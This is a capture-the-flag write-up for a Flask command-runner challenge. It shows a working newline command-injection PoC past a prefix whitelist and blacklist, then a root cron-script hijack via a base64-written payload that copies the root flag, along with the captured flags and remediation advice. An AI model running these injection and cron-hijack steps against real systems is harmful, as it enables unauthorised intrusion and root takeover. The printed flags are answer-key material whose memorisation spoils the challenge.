# Healthy Hijack - 2 — Full Writeup

**Category:** Infra / Web → Privilege Escalation
**Difficulty:** 20 points
**Target:** `http://kicyber-9c272408f0ca-healthyhijack-0-0.chals.io`
**Goal:** Get to root.

---

## TL;DR (Flags)

| Flag type | Location | Value |
|---|---|---|
| User flag | `/home/appuser/user.txt` | `KPMG_CTF{034900d5c0ef21d3548e7bc6e9c1db9b}` |
| Root flag | `/root/root.txt` | `KPMG_CTF{YTJYAkR73q4J5WjnWc8wB0fwV5dfbvJNPaTPajwa0Xzu}` |

> This is a sibling instance of **Healthy Hijack - 1**: the same vulnerable web
> application, same container image, same misconfiguration — but a fresh pair of
> flags. The full attack chain from challenge 1 applies directly.

---

## 1. Reconnaissance

The root page is identical to challenge 1 — a Flask **"Safe Command Runner"** that
POSTs a `cmd` field to `/run` and allows only a whitelisted set of "network debugging
commands" (`ping`, `traceroute`, `nslookup`). `ping` fails inside the container
(no `CAP_NET_RAW`), while `nslookup` executes normally.

Recovered the app source from the live server (`artifacts/app.py` — same bytes as
challenge 1, 3206 bytes):

```python
ALLOWED_COMMANDS = ["ping", "traceroute", "nslookup"]

def is_allowed(cmd):
    return any(cmd.startswith(c) for c in ALLOWED_COMMANDS)   # prefix whitelist

def sanitize(user_input):
    blacklist = [";", "&", "|", "`", "$(", "<"]
    for b in blacklist:
        user_input = user_input.replace(b, "")
    return user_input

cmd = sanitize(cmd)
result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, timeout=10)
```

---

## 2. Filter Bypass → RCE as appuser

Two flaws compose:

1. `is_allowed()` is checked **before** sanitisation and only requires the input to
   **start with** an allowed command.
2. `sanitize()` strips `; & | \` $( <` but **not the newline**, and the command is
   executed with `shell=True`, so any line after a newline runs as a brand-new
   shell command.

PoC (newline injection):

```bash
curl -sk -X POST https://kicyber-9c272408f0ca-healthyhijack-0-0.chals.io/run \
  --data-urlencode $'cmd=nslookup localhost\nid'
```

Output:

```
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

Injected commands must avoid the filtered characters (use `\n` to chain commands;
use base64 for file writes). Reusable helper: `artifacts/poc_rce.sh`.

### Enumeration (as appuser)

- Container: Debian 13 (trixie), hostname `c333fb8cb97c`
- `appuser` (uid=1000), `/app` working directory
- PID 1 = `su appuser -c "python /app/app.py"` (root-owned, full capabilities)
- No SUID binaries; `/root` and `/etc/shadow` not readable
- `/opt/healthcheck.sh` — **world-writable** (`-rwxrwxrwx root root`)
- `/etc/crontab` runs `/opt/healthcheck.sh` **as root** six times per minute
  (at `:00`, `:10`, `:20`, `:30`, `:40`, `:50`)
- A `find /tmp -perm /4000 -delete` cron line removes SUID plants under `/tmp`
  (blocks the classic SUID-copy escalation; writable-script is the intended path)
- `/entrypoint.sh` reveals flags are random per instance and `chmod 600 /root/root.txt`
- **User flag:** `/home/appuser/user.txt` →
  `KPMG_CTF{034900d5c0ef21d3548e7bc6e9c1db9b}`

---

## 3. Privilege Escalation → Root

The root-owned, world-writable `/opt/healthcheck.sh` is executed by cron as root
up to once every 10 seconds — classic **crontab script hijack**.

1. Overwrite it with an exfiltration payload (installed with base64 so no filtered
   characters appear in the injection):

   ```bash
   # payload:
   #!/bin/sh
   cp /root/root.txt /tmp/rootflag.txt
   chmod 666 /tmp/rootflag.txt

   echo IyEvYmluL3NoCmNwIC9yb290L3Jvb3QudHh0IC90bXAvcm9vdGZsYWcudHh0CmNobW9kIDY2NiAvdG1wL3Jvb3RmbGFnLnR4dAo= > /tmp/b64
   base64 -d /tmp/b64 > /opt/healthcheck.sh
   ```

2. Wait one cron tick (`sleep 12`; cron fires every 10 s).

3. Read the flag:

   ```
   $ cat /tmp/rootflag.txt
   KPMG_CTF{YTJYAkR73q4J5WjnWc8wB0fwV5dfbvJNPaTPajwa0Xzu}
   ```

4. Clean up — restore the original script:

   ```bash
   echo IyEvYmluL3NoCiMgU3lzdGVtIGhlYWx0aGNoZWNrCmVjaG8gIk9LIiA+IC90bXAvaGVhbHRoLmxvZwo= > /tmp/b64
   base64 -d /tmp/b64 > /opt/healthcheck.sh
   ```

---

## 4. Attack Chain Summary

```
Web form /run ── prefix whitelist passes "nslookup localhost"
        │
        ├─ sanitizer forgets the newline "\n"
        ▼
subprocess.run(..., shell=True)  →  RCE as appuser (uid 1000)
        │
        ├─ user.txt  →  USER FLAG
        ▼
/etc/crontab:  * * * * * root /opt/healthcheck.sh   (every 10 s)
        │
        ▼
/opt/healthcheck.sh  (-rwxrwxrwx, root:root, world-writable)
        │
        ▼
overwrite → cp /root/root.txt /tmp/rootflag.txt → chmod 666
        │
        ▼
next cron tick runs it as root  →  ROOT FLAG
```

---

## 5. Remediation

1. **Never run `shell=True` with user input** — use `subprocess.run([...])` with an
   argument list and validate arguments against a strict allow-list (IP/hostname regex).
2. **Fix the prefix whitelist** — exact-token match against a safe command list, and
   restrict allowed options.
3. **Replace the blacklist** with an allow-list of permitted characters — blocklists
   miss separators like `\n`, tabs, `>`, `$`, `)`, `{}`.
4. **Don't leave cron scripts world-writable** — store root-run scripts in
   root-only locations (`/usr/local/sbin`, `0755 root:root`).
5. Run the service in a capability-restricted container and drop `NET_RAW` etc. for
   the web process.

---

## 6. Timeline (UTC)

| Time | Step |
|---|---|
| 02:36 | Recon: identical Flask app; newline injection re-verified |
| 02:37 | Recovered `app.py`; enumerated container, crontab, entrypoint |
| 02:38 | Overwrote `/opt/healthcheck.sh` with root-flag exfil |
| 02:38 | **Root flag captured** on next cron tick |
| 02:39 | Restored `healthcheck.sh`; confirmed both flags |

## 7. Artifacts

- `artifacts/app.py` – recovered application source
- `artifacts/poc_rce.sh` – reusable newline-injection RCE helper
- `artifacts/healthcheck_payload.sh` – cron-hijack payload
- `artifacts/flags.txt` – captured flags
- `artifacts/evidence_output.txt` – key command outputs